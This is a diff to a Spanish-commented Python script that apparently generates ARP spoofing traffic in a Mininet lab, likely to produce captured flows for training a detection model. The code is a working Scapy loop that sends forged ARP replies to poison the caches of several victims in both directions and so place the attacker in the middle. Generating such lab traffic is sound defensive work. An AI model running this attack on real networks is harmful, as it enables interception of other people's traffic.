@@ -1,22 +1,17 @@
 #!/usr/bin/env python3
 """
-arp_spoof.py
-------------
-Envía respuestas ARP falsificadas de forma continua para simular un
-ataque de ARP spoofing dentro del laboratorio Mininet.
-
-Ejecución:
+mininet_lab/arp_spoof.py
+------------------------
+Genera un ataque de ARP spoofing en el laboratorio: envía respuestas ARP
+falsificadas de forma continua para envenenar la caché de una o varias
+víctimas, haciéndoles creer que 'ip_a_suplantar' está en la MAC del
+atacante.
+ 
     python3 arp_spoof.py <ip_a_suplantar> <mac_atacante> <victima1> [victima2 ...]
-
-Envenena la caché ARP de UNA O VARIAS víctimas haciéndoles creer que
-'ip_a_suplantar' está en la MAC del atacante. El ARP spoofing real rara
-vez ataca a una sola víctima: lo habitual es envenenar a varios hosts a
-la vez (o a toda la subred) para interceptar su tráfico. Soportar varias
-víctimas, además de ser más realista, genera bastantes más flujos
-capturables -antes una fase de spoofing dejaba apenas 1-3 flujos en toda
-la red, demasiado poco para que el modelo aprendiera el patrón-.
-
-Se detiene con Ctrl+C o al recibir SIGTERM.
+ 
+Admite varias víctimas porque el ARP spoofing real rara vez ataca a una
+sola. Lo lanza el generador de tráfico; se detiene con Ctrl+C o
+SIGTERM.
 """
 import sys
 import time
@@ -34,19 +29,19 @@ def main():
     victims = sys.argv[3:]
 
     def send_fake_arp(target_ip, impersonated_ip):
-        # op=2 -> respuesta ARP ("is-at"): le decimos a target_ip que
-        # impersonated_ip esta en la MAC del atacante. Es una respuesta
-        # que nadie ha pedido (ARP gratuito), la firma del ataque.
+        # op=2 es una respuesta ARP ("is-at") que nadie ha solicitado
+        # (ARP gratuito): le dice a target_ip que impersonated_ip está en
+        # la MAC del atacante. Es la firma del ataque.
         pkt = ARP(op=2, pdst=target_ip, hwsrc=attacker_mac, psrc=impersonated_ip)
         send(pkt, verbose=False)
 
     try:
         while True:
+            # Se envenena en ambos sentidos para situar al atacante en
+            # medio de la comunicación: la víctima cree que la IP
+            # suplantada está en su MAC, y el host suplantado cree lo
+            # mismo de la víctima.
             for victim_ip in victims:
-                # Envenenar en ambos sentidos: la victima cree que la IP
-                # suplantada esta en la MAC del atacante, y el host
-                # suplantado cree lo mismo de la victima -asi el atacante
-                # se coloca en medio de la comunicacion entre ambos-.
                 send_fake_arp(victim_ip, spoofed_ip)
                 send_fake_arp(spoofed_ip, victim_ip)
             time.sleep(1)
